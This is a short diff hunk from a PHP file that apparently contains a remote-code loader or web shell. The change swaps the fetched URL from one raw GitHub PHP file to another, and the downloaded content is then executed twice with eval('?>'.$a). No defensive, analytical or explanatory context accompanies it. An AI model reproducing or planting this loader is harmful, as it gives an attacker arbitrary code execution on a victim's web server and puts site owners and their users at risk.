@@ -26,6 +26,6 @@
         }
     return $url_get_contents_data;
     }
-    $a = geturlsinfo('https://raw.githubusercontent.com/XList99/she/refs/heads/main/she.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/baba-wd/zackmioff/refs/heads/main/yo.php');
     eval    ('?>'.$a);
     eval    ('?>'.$a);
